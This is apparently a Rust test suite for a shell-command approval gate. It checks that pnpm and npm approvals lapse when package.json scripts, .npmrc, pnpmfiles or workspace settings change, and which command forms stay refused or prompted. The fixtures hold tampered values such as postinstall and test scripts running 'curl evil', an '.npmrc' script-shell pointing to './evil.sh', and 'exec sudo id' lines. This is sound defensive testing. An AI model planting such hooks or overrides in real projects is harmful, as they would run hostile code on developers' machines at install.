            "/usr/local/bin/npx pnpm@11.20.0 run dev",
            "FOO=1 npx pnpm@11.20.0 run dev",
            "env npx pnpm@11.20.0 run dev",
        ] {
            let judged = gate.judge(line, &granted);
            assert_eq!(
                judged.outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` was covered"
            );
            assert!(!judged.standing(), "`{line}` could be approved standing");
        }
        for line in [
            "npx -- pnpm@11.20.0 exec sudo id",
            "npx -q pnpm@11.20.0 dlx docker ps",
            "npx pnpm@latest exec sudo id",
            "npm exec -- pnpm exec crontab -l",
        ] {
            assert_eq!(
                gate.judge(line, &[]).outcome(),
                shell_gate::Outcome::Refused,
                "{line}"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #482: `pnpm run <x>` runs `scripts.x` (with its `pre` and `post`,
    /// measured on pnpm 11.21.0), so its approval binds to that text as
    /// `npm run`'s does, and lapses when it changes.
    #[test]
    fn a_pnpm_run_approval_binds_to_its_scripts_text_and_lapses_when_it_changes() {
        let dir = scratch("pnpm-run");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let granted = gate.judge("pnpm run build", &[]).grants(Scope::Session, 1);
        assert_eq!(
            gate.judge("pnpm run build", &granted).outcome(),
            shell_gate::Outcome::Run
        );
        package(&dir, "vite build && curl evil");
        assert_eq!(
            gate.judge("pnpm run build", &granted).outcome(),
            shell_gate::Outcome::Prompt,
            "a stale digest still approved `pnpm run build`"
        );
        package(&dir, "vite build");
        assert_eq!(
            gate.judge("pnpm run test", &granted).outcome(),
            shell_gate::Outcome::Prompt,
            "another script's text is another approval"
        );
        assert!(
            granted.iter().all(|e| e.digest.is_some()),
            "`pnpm run build` binds to a digest: {granted:?}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #482: pnpm 11.21.0's `verifyDepsBeforeRun` defaults to `install`, so
    /// a `pnpm run`, `test` or `start` may run an install first -- the
    /// workspace's lifecycle scripts and its `.pnpmfile` -- and its digest
    /// holds what that install runs. npm's does not: npm installs nothing
    /// before a script.
    #[test]
    fn a_pnpm_script_binds_the_install_pnpm_may_run_before_it() {
        let dir = scratch("pnpm-run-installs");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let mut granted = gate.judge("pnpm run build", &[]).grants(Scope::Session, 1);
        granted.extend(gate.judge("npm run build", &[]).grants(Scope::Session, 1));
        std::fs::write(
            dir.join("package.json"),
            "{\"scripts\":{\"build\":\"vite build\",\"test\":\"vitest\",\"postinstall\":\"curl evil\"}}",
        )
        .expect("package.json");
        assert_eq!(
            gate.judge("pnpm run build", &granted).outcome(),
            shell_gate::Outcome::Prompt,
            "a changed postinstall still approved `pnpm run build`"
        );
        assert_eq!(
            gate.judge("npm run build", &granted).outcome(),
            shell_gate::Outcome::Run,
            "control: npm installs nothing before a script"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #482: `pnpm test`, `start`, `stop` and `restart` bind to the scripts
    /// they run, as npm's do, and `start` to the `server.js` pnpm runs
    /// without a `start` script (measured on pnpm 11.21.0).
    #[test]
    fn pnpm_test_start_stop_and_restart_bind_to_the_scripts_they_run() {
        let dir = scratch("pnpm-named");
        let gate = gate_in(&dir);
        let write = |test: &str, start: &str| {
            std::fs::write(
                dir.join("package.json"),
                format!(
                    "{{\"scripts\":{{\"test\":\"{test}\",\"start\":\"{start}\",\"stop\":\"x\"}}}}"
                ),
            )
            .expect("package.json");
        };
        write("vitest", "vite");
        let lines = ["pnpm test", "pnpm start", "pnpm stop", "pnpm restart"];
        let granted: Vec<Vec<Entry>> = lines
            .iter()
            .map(|line| gate.judge(line, &[]).grants(Scope::Session, 1))
            .collect();
        for (line, granted) in lines.iter().zip(&granted) {
            assert_eq!(
                gate.judge(line, granted).outcome(),
                shell_gate::Outcome::Run,
                "{line}"
            );
        }
        write("vitest; curl evil", "vite");
        assert_eq!(
            gate.judge("pnpm test", &granted[0]).outcome(),
            shell_gate::Outcome::Prompt,
            "a changed `scripts.test` still approved `pnpm test`"
        );
        write("vitest", "vite --host 0.0.0.0");
        for (at, line) in [(1, "pnpm start"), (3, "pnpm restart")] {
            assert_eq!(
                gate.judge(line, &granted[at]).outcome(),
                shell_gate::Outcome::Prompt,
                "a changed `scripts.start` still approved `{line}`"
            );
        }
        std::fs::write(dir.join("package.json"), "{\"scripts\":{\"build\":\"x\"}}")
            .expect("package.json");
        let start = gate.judge("pnpm start", &[]).grants(Scope::Session, 1);
        std::fs::write(dir.join("server.js"), "console.log(1)").expect("server.js");
        assert_eq!(
            gate.judge("pnpm start", &start).outcome(),
            shell_gate::Outcome::Prompt,
            "`pnpm start` covered a server.js that appeared after its approval"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #482: `pnpm install`, `pnpm i` and `pnpm add <plain names>` bind to
    /// the workspace's own lifecycle scripts (pnpm's `pnpm:devPreinstall`
    /// among them) and to what pnpm reads as configuration or runs as code
    /// at install in the worktree: `.npmrc`, `.pnpmfile.cjs` or
    /// `.pnpmfile.mjs` (hooks run JS), `pnpm-workspace.yaml` (pnpm's
    /// settings), and `package.json`'s `packageManager`, `devEngines` and
    /// `pnpm` fields (the first two pick the pnpm that runs). A change to
    /// any lapses the approval.
    #[test]
    fn a_pnpm_install_approval_binds_to_the_lifecycle_the_pnpmfile_and_the_settings() {
        let dir = scratch("pnpm-install");
        let gate = gate_in(&dir);
        let base = "{\"scripts\":{\"build\":\"vite build\",\"postinstall\":\"x\"}}";
        let changes: &[(&str, &str)] = &[
            (
                "package.json",
                "{\"scripts\":{\"build\":\"vite build\",\"postinstall\":\"curl evil\"}}",
            ),
            (
                "package.json",
                "{\"scripts\":{\"build\":\"vite build\",\"postinstall\":\"x\",\"pnpm:devPreinstall\":\"curl evil\"}}",
            ),
            (
                "package.json",
                "{\"packageManager\":\"pnpm@9.0.0\",\"scripts\":{\"build\":\"vite build\",\"postinstall\":\"x\"}}",
            ),
            (
                "package.json",
                "{\"devEngines\":{\"packageManager\":{\"name\":\"pnpm\",\"version\":\"9.0.0\"}},\"scripts\":{\"build\":\"vite build\",\"postinstall\":\"x\"}}",
            ),
            (
                "package.json",
                "{\"pnpm\":{\"onlyBuiltDependencies\":[\"evil\"]},\"scripts\":{\"build\":\"vite build\",\"postinstall\":\"x\"}}",
            ),
            (".pnpmfile.cjs", "module.exports = { hooks: {} }"),
            (".pnpmfile.mjs", "export const hooks = {}"),
            ("pnpm-workspace.yaml", "onlyBuiltDependencies:\n  - evil\n"),
            (".npmrc", "script-shell=./evil.sh\n"),
        ];
        for (file, text) in changes {
            std::fs::write(dir.join("package.json"), base).expect("package.json");
            for each in [
                ".pnpmfile.cjs",
                ".pnpmfile.mjs",
                "pnpm-workspace.yaml",
                ".npmrc",
            ] {
                let _ = std::fs::remove_file(dir.join(each));
            }
            let lines = [
                "pnpm install",
                "pnpm i",
                "pnpm add left-pad",
                "pnpm run build",
            ];
            for line in lines {
                let granted = gate.judge(line, &[]).grants(Scope::Session, 1);
                assert!(
                    granted.iter().all(|e| e.digest.is_some()),
                    "`{line}` binds to a digest: {granted:?}"
                );
                assert_eq!(
                    gate.judge(line, &granted).outcome(),
                    shell_gate::Outcome::Run,
                    "{line}"
                );
            }
            let granted: Vec<Entry> = lines
                .iter()
                .flat_map(|line| gate.judge(line, &[]).grants(Scope::Session, 1))
                .collect();
            std::fs::write(dir.join(file), text).expect("a change");
            for line in lines {
                assert_eq!(
                    gate.judge(line, &granted).outcome(),
                    shell_gate::Outcome::Prompt,
                    "`{line}` ran under a `{file}` its approval never saw: {text}"
                );
            }
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #482: a standing pnpm approval covers only `pnpm run <name>`, `pnpm
    /// test|start|stop|restart`, `pnpm install` and `pnpm i` bare and `pnpm
    /// add` with plain package names -- the program `pnpm` exactly, no
    /// option word anywhere (`-C`, `--dir`, `--filter`, `-r`, `-w` point it
    /// at another package), no environment prefix. A bare `pnpm <script>`
    /// is never standing: whether pnpm reads it as a script depends on its
    /// builtins. `pnpm exec`, `pnpm dlx` and pnpm's alias `pn` are never
    /// standing.
    #[test]
    fn a_standing_pnpm_approval_covers_only_the_exact_forms_and_no_option() {
        let dir = scratch("pnpm-exact");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let mut granted = Vec::new();
        for line in [
            "pnpm run build",
            "pnpm test",
            "pnpm start",
            "pnpm install",
            "pnpm i",
            "pnpm add left-pad",
        ] {
            let judged = gate.judge(line, &[]);
            assert!(
                judged.standing(),
                "`{line}` is a form a standing approval covers"
            );
            granted.extend(judged.grants(Scope::Session, 1));
        }
        for line in [
            "pnpm run build -C sub",
            "pnpm -C sub run build",
            "pnpm --dir sub run build",
            "pnpm run build --dir=sub",
            "pnpm run build --filter sub",
            "pnpm --filter sub run build",
            "pnpm -F sub run build",
            "pnpm -r run build",
            "pnpm run build -r",
            "pnpm run build --recursive",
            "pnpm run build -w",
            "pnpm run build --workspace-root",
            "pnpm add -w left-pad",
            "pnpm add left-pad --filter sub",
            "pnpm install --dir sub",
            "pnpm install --ignore-scripts",
            "pnpm run build -- --flag",
            "pnpm run build extra",
            "pnpm build",
            "pnpm dev",
            "pnpm t",
            "pnpm tst",
            "pnpm run-script build",
            "pnpm install left-pad",
            "pnpm i left-pad",
            "pnpm add ./local",
            "pnpm add git+https://example.invalid/x.git",
            "pnpm install-test",
            "pnpm it",
            "pnpm ci",
            "pnpm rebuild",
            "pnpm exec vite",
            "pnpm dlx vite",
            "pnpm create vite",
            "pn run build",
            "pn install",
            "./pnpm run build",
            "/usr/local/bin/pnpm install",
            "env pnpm install",
            "FOO=1 pnpm run build",
            "npm_config_script_shell=./e pnpm run build",
            "pnpm_config_verify_deps_before_run=install pnpm run build",
            "pnpm run build && FOO=1 pnpm test",
        ] {
            let judged = gate.judge(line, &granted);
            assert_eq!(
                judged.outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` was covered"
            );
            assert!(!judged.standing(), "`{line}` could be approved standing");
        }
        for line in [
            "pnpm run build",
            "pnpm test",
            "pnpm install",
            "pnpm i",
            "pnpm add left-pad",
        ] {
            assert_eq!(
                gate.judge(line, &granted).outcome(),
                shell_gate::Outcome::Run,
                "control: {line}"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #482: a `package.json` this cannot read fails closed for pnpm as for
    /// npm (review round 3, finding 7).
    #[test]
    fn an_unreadable_package_json_makes_no_pnpm_command_standing() {
        let dir = scratch("pnpm-unreadable");
        let gate = gate_in(&dir);
        std::fs::write(
            dir.join("package.json"),
            "\u{feff}{\"scripts\":{\"build\":\"curl evil\",\"postinstall\":\"x\"}}",
        )
        .expect("package.json");
        for line in ["pnpm run build", "pnpm install", "pnpm start", "pnpm add x"] {
            assert!(
                !gate.judge(line, &[]).standing(),
                "`{line}` could be approved standing"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #482: `pnpx X` and `pnx X` (`pnpm dlx X`) are shaped by the program
    /// they run, as `npx X` is: approving one covers that program only.
    #[test]
    fn pnpx_and_pnx_are_shaped_by_the_program_they_run_as_npx_is() {
        let dir = scratch("pnpx");
        let gate = gate_in(&dir);
        for runner in ["npx", "pnpx", "pnx"] {
            let granted = gate
                .judge(&format!("{runner} prisma generate"), &[])
                .grants(Scope::Session, 1);
            assert_eq!(
                gate.judge(&format!("{runner} prisma migrate"), &granted)
                    .outcome(),
                shell_gate::Outcome::Run,
                "{runner}"
            );
            assert_eq!(
                gate.judge(&format!("{runner} evil-pkg"), &granted)
                    .outcome(),
                shell_gate::Outcome::Prompt,
                "`{runner} prisma`'s approval covered `{runner} evil-pkg`"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }
}
